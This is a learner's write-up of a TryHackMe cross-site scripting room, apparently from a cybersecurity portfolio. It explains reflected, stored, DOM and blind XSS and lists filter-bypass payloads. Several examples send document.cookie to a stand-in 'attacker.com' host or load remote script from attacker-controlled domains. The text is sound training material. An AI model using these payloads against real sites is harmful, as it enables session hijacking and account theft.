# TryHackMe — XSS Introduction

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red)
![Topic](https://img.shields.io/badge/Topic-XSS-orange)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-June%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Room | XSS Introduction |
| Path | Jr Penetration Tester → Web Application Vulnerabilities I |
| Tasks Completed | Task 1 — Task 9 (all, 100%) |
| Date Completed | June 2026 |

---

## Tasks Completed

| Task | Topic | Status |
|------|-------|--------|
| Task 1 | Introduction | ✅ Done |
| Task 2 | Important Terminologies | ✅ Done |
| Task 3 | XSS Payloads | ✅ Done |
| Task 4 | Reflected XSS - Non-Persistent | ✅ Done |
| Task 5 | Stored XSS - Persistent | ✅ Done |
| Task 6 | DOM-Based XSS - Client Side | ✅ Done |
| Task 7 | Blind XSS | ✅ Done |
| Task 8 | Perfecting your Payload | ✅ Done |
| Task 9 | Summary | ✅ Done |

---

## What is XSS?

Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into a web page that is then executed in another user's browser.

**Key distinction from CSRF (which I learned earlier):**

| | XSS | CSRF |
|--|-----|------|
| Exploits trust in | The website (user trusts the site's content) | The browser (server trusts the browser's cookies) |
| Attacker controls | Code that runs in the victim's browser | Requests sent on the victim's behalf |
| Requires | Unsanitised input reflected/stored on the page | A predictable or missing CSRF token |

---

## Task 2 — Important Terminology

| Term | Meaning |
|------|---------|
| **Payload** | The malicious script injected (e.g. `<script>alert(1)</script>`) |
| **Sink** | The point in the application where untrusted input is rendered/executed |
| **Source** | Where attacker-controlled input enters the application (URL parameter, form field, header) |
| **Sanitisation** | Removing or encoding dangerous characters before rendering input |
| **Context** | Where in the page the payload lands — HTML body, attribute, JavaScript, URL — determines what payload syntax works |

---

## Task 3 — XSS Payloads

### Basic payload structures

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

### Why context matters

The same payload doesn't work everywhere. The injection point determines the syntax needed.

| Context | Example injection point | Working payload style |
|---------|-------------------------|----------------------|
| HTML body | `<p>USER_INPUT</p>` | `<script>alert(1)</script>` |
| HTML attribute | `<input value="USER_INPUT">` | `"><script>alert(1)</script>` |
| JavaScript string | `var x = "USER_INPUT";` | `";alert(1);//` |
| URL/href | `<a href="USER_INPUT">` | `javascript:alert(1)` |

**What I learned:** Before writing any payload, identify exactly where the input lands in the page source. A payload built for HTML body context will not fire inside an HTML attribute — breaking out of the attribute first is required.

---

## Task 4 — Reflected XSS (Non-Persistent)

The payload is part of the request and immediately reflected back in the response — never stored anywhere.

### How it works

```
1. Attacker crafts a malicious URL:
   http://target.com/search?q=<script>alert(document.cookie)</script>

2. Victim clicks the link (via phishing email, malicious ad, etc.)

3. Server reflects the input directly into the page without sanitising:
   <p>You searched for: <script>alert(document.cookie)</script></p>

4. Victim's browser executes the script
```

**Key characteristic:** Requires social engineering — the attacker must get the victim to click a specific crafted link. The payload does not persist; it only exists for that single request/response.

**Real attack example (cookie theft):**
```html
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**What I learned:** Reflected XSS is the easiest type to find — any parameter that gets echoed back unmodified in the response is a candidate. It is also the easiest to test quickly, since the result is visible immediately in the same request/response cycle.

---

## Task 5 — Stored XSS (Persistent)

The payload is saved on the server (database, file, comment field) and served to **every** user who views the affected page — not just the one who submitted it.

### How it works

```
1. Attacker submits malicious payload into a stored field:
   Comment box: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

2. Server stores the comment in the database WITHOUT sanitising it

3. Every user who later views that page/comment section
   has the script execute in THEIR browser

4. No phishing link needed — victims are compromised just by visiting the page normally
```

**Why Stored XSS is more dangerous than Reflected:**

| | Reflected XSS | Stored XSS |
|--|---------------|------------|
| Requires victim to click a crafted link? | ✅ Yes | ❌ No |
| Affects how many users? | One per attack | Every visitor to the page |
| Persistence | None — single request | Permanent until removed |
| Severity | Generally Medium | Generally High/Critical |

**Common injection points for Stored XSS:**
- Comment sections
- User profile fields (bio, display name)
- Support ticket descriptions
- Product reviews
- File upload metadata (filename, EXIF data)

**What I learned:** Stored XSS is rated more severely in bug bounty programs precisely because it requires zero additional social engineering — once planted, it silently compromises anyone who views the page.

---

## Task 6 — DOM-Based XSS (Client-Side)

Unlike Reflected and Stored XSS (which involve the server), DOM-Based XSS happens entirely in the browser — the server never sees the malicious payload at all.

### How it works

```javascript
// Vulnerable client-side JavaScript
var name = document.location.hash.substring(1);
document.getElementById('welcome').innerHTML = "Welcome, " + name;
```

```
Attack URL:
http://target.com/#<img src=x onerror=alert(1)>

The fragment (#...) is never sent to the server —
JavaScript reads it directly from the URL and writes it into the page
```

### Why this matters

- Server-side input validation is completely bypassed — the payload never reaches the server
- Traditional WAFs (Web Application Firewalls) often miss DOM XSS since they only inspect server-bound traffic
- Common in modern JavaScript-heavy single-page applications (SPAs)

### Dangerous JavaScript sinks to look for

| Sink | Why it's dangerous |
|------|---------------------|
| `innerHTML` | Directly renders HTML, including scripts |
| `document.write()` | Writes directly into the page |
| `eval()` | Executes a string as JavaScript code |
| `location.href` | Can be used for `javascript:` URI injection |
| `setTimeout()` / `setInterval()` with string argument | Executes string as code |

**What I learned:** DOM XSS requires reviewing client-side JavaScript source code, not just testing server responses. This is a fundamentally different testing approach — view-source and the browser's Sources tab become the primary tools instead of Burp Repeater against server requests.

---

## Task 7 — Blind XSS

A variant of Stored XSS where the payload fires in a context the attacker cannot directly observe — typically an admin panel, support dashboard, or internal logging system.

### How it works

```
1. Attacker submits a payload into a public-facing field
   (e.g. a "Contact Us" form, support ticket, or feedback box)

2. The payload is stored and later viewed by an ADMIN
   in a backend panel the attacker has no access to

3. The script fires in the admin's browser — completely invisible to the attacker
   unless the payload calls back to attacker-controlled infrastructure
```

### Detecting Blind XSS

Since the attacker can't see the result directly, callback-based payloads are used:

```html
<script src="https://attacker-controlled.com/xss.js"></script>
```

Tools like **XSS Hunter** or a custom callback server log when the payload executes, capturing:
- The page URL where it fired
- Cookies, local storage
- Screenshot of the page (in advanced tools)
- IP address of whoever triggered it (often reveals it was an admin)

**What I learned:** Blind XSS is one of the highest-value findings in bug bounty hunting because it often means compromising an administrator's session — far more valuable than compromising a regular user. Any input field that might be reviewed by staff (support tickets, contact forms, user reports) is worth testing with a blind XSS payload.

---

## Task 8 — Perfecting Your Payload

Real-world applications often have filters and sanitisation in place. This task covered techniques to bypass common defences.

### Common filter bypass techniques

```html
<!-- Basic payload blocked? Try alternate tags -->
<script>alert(1)</script>           <!-- blocked -->
<img src=x onerror=alert(1)>        <!-- alternate event handler -->
<svg onload=alert(1)>               <!-- alternate tag -->
<body onload=alert(1)>              <!-- alternate tag -->

<!-- Case variation (if filter is case-sensitive) -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoding to bypass keyword filters -->
<img src=x onerror=alert(String.fromCharCode(88,83,83))>

<!-- Breaking up the word "script" -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Using HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Event handlers without script tags -->
<a href="javascript:alert(1)">click</a>
<input autofocus onfocus=alert(1)>
```

### Bypassing length restrictions

```html
<!-- Short payload for limited character count -->
<svg/onload=alert(1)>

<!-- Even shorter, using existing page JS -->
<script src=//attacker.com/x.js>
```

**What I learned:** Filter bypass is iterative — try a payload, observe what gets blocked or modified, adjust based on that specific filter's behaviour. There is no universal bypass; each application's sanitisation has different gaps. Building a personal library of alternate payloads (different tags, different event handlers, different encodings) speeds this process up significantly.

---

## XSS Types Comparison Summary

| Type | Where it executes | Persistence | Server involvement | Typical severity |
|------|-------------------|-------------|---------------------|-------------------|
| **Reflected** | Victim's browser, single request | None | Server reflects input | Medium |
| **Stored** | Every visitor's browser | Permanent (until removed) | Server stores input | High/Critical |
| **DOM-Based** | Victim's browser only | None (client-side only) | Server never sees payload | Medium/High |
| **Blind** | Out-of-sight viewer's browser (often admin) | Permanent | Server stores input | High/Critical |

---

## Key Takeaways

- **Context determines payload syntax** — always identify whether input lands in HTML body, an attribute, JavaScript, or a URL before crafting a payload
- **Stored and Blind XSS are the highest-value findings** — they require no social engineering and can compromise privileged users like admins
- **DOM XSS requires reading JavaScript source, not just testing server responses** — a fundamentally different testing approach than the other three types
- **`document.cookie` exfiltration is the classic proof-of-impact** — demonstrating that an attacker could steal a session, not just pop an alert box, is what makes a finding credible in a report
- **Filter bypass is a process, not a single trick** — maintain a personal payload list with tag variations, event handler variations, and encoding variations

---

## Connection to PortSwigger Labs

| This Room | PortSwigger Equivalent |
|-----------|------------------------|
| Reflected XSS | Reflected XSS into HTML context labs |
| Stored XSS | Stored XSS into HTML context labs |
| DOM-Based XSS | DOM XSS labs (innerHTML, document.write sinks) |
| Filter bypass | XSS filter evasion labs |

---

## Resources

- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [XSS Hunter — Blind XSS detection](https://xsshunter.com)

---

## My Progress

- [x] CSRF Introduction
- [x] SQL Injection
- [x] XSS Introduction ← *this writeup*
- [x] Intro to SSRF
- [ ] Authentication, Access Control — continuing PortSwigger

---

*Part of my 6-month cybersecurity portfolio — [github.com/shehrozmajeed](https://github.com/shehrozmajeed)*
